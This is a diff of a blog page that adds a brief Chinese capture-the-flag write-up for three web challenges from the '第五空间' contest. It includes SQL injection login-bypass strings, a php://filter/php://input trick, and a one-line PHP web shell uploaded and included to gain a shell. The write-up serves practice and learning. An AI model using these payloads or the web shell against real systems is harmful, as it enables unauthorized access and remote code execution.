@@ -127,17 +127,20 @@
 
 
 
-<meta name="description" content="周三考完试后完成">
+<meta name="description" content="空相一进题目发现给个提示要求你输入 id：）,所以就在地址栏后先猜想传入？Id=1:)果然出现了果断访问 php 发现出现一堆乱码，所以抓包试试看，这里我直接用的检查者工具，发现响应中说传入个 token 试试，官方之前说过Token 存在本地 cookie 里 所以二话不说把 login-token 的内容传进参数里，最后得到flag 五叶一开始用 bp 抓包后看到这里，想到会跟解码有关，做了一">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第五空间">
 <meta property="og:url" content="http://yoursite.com/2019/12/10/第五空间/index.html">
 <meta property="og:site_name" content="disshu">
-<meta property="og:description" content="周三考完试后完成">
+<meta property="og:description" content="空相一进题目发现给个提示要求你输入 id：）,所以就在地址栏后先猜想传入？Id=1:)果然出现了果断访问 php 发现出现一堆乱码，所以抓包试试看，这里我直接用的检查者工具，发现响应中说传入个 token 试试，官方之前说过Token 存在本地 cookie 里 所以二话不说把 login-token 的内容传进参数里，最后得到flag 五叶一开始用 bp 抓包后看到这里，想到会跟解码有关，做了一">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-09T12:55:31.106Z">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/第五空间/img/picture1.png">
+<meta property="og:image" content="http://yoursite.com/2019/12/10/第五空间/img/picture2.png">
+<meta property="og:updated_time" content="2019-12-11T15:29:18.050Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="第五空间">
-<meta name="twitter:description" content="周三考完试后完成">
+<meta name="twitter:description" content="空相一进题目发现给个提示要求你输入 id：）,所以就在地址栏后先猜想传入？Id=1:)果然出现了果断访问 php 发现出现一堆乱码，所以抓包试试看，这里我直接用的检查者工具，发现响应中说传入个 token 试试，官方之前说过Token 存在本地 cookie 里 所以二话不说把 login-token 的内容传进参数里，最后得到flag 五叶一开始用 bp 抓包后看到这里，想到会跟解码有关，做了一">
+<meta name="twitter:image" content="http://yoursite.com/2019/12/10/第五空间/img/picture1.png">
 
 
 
@@ -380,7 +383,16 @@
       
 
       
-        <p>周三考完试后完成</p>
+        <h1 id="空相"><a href="#空相" class="headerlink" title="空相"></a>空相</h1><p>一进题目发现给个提示要求你输入 id：）,所以就在地址栏后先猜想传入？Id=1:)果然出现了<br><img src="img/picture1.png" alt="avatar1"><br>果断访问 php 发现出现一堆乱码，所以抓包试试看，这里我直接用的检查者工具，发现响应中说传入个 token 试试，官方之前说过<br>Token 存在本地 cookie 里 所以二话不说把 login-token 的内容传进参数里，最后得到flag</p>
+<h1 id="五叶"><a href="#五叶" class="headerlink" title="五叶"></a>五叶</h1><p><img src="img/picture2.png" alt="avatar2"><br>一开始用 bp 抓包后看到这里，想到会跟解码有关，做了一会儿，发现丝毫不对，后来问了大佬才知道这题和 sql 注入有关，所以首先用了万能密码</p>
+<p>Admin’ or ‘1’=’1</p>
+<p>然而发现不对，可能有过滤 把 or 换成||并找到和 admin 有关的那一条信息</p>
+<p><code>user=admin&amp;password=1&#39;)||username like &#39;admin&#39;-- -</code></p>
+<h1 id="空性"><a href="#空性" class="headerlink" title="空性"></a>空性</h1><p>.swp文件泄露，简单审计，通过php://input绕过</p>
+<p><code>?fname=php://filter</code> </p>
+<p>POST: <code>whoami</code></p>
+<p>来到后台文件上传，发现<code>?file</code>参数包含了同目录一个文件，fuzz发现只能包含html文件，且需去掉后缀</p>
+<p>上传一个html文件：<code>&lt;?php $f = $_GET[f]; $f($_GET[s]); ?&gt;</code>,包含:<code>?file=upload/xxxxxxxx</code>，成功getshell</p>
 
       
     </div>
@@ -414,6 +426,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/disshu.github.io/2019/12/11/密码学-DES/" rel="prev" title="密码学-DES">
+                密码学-DES <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -465,8 +481,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -481,7 +506,7 @@
               
                 <a href="/disshu.github.io/archives/">
               
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -508,6 +533,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#空相"><span class="nav-number">1.</span> <span class="nav-text">空相</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#五叶"><span class="nav-number">2.</span> <span class="nav-text">五叶</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#空性"><span class="nav-number">3.</span> <span class="nav-text">空性</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
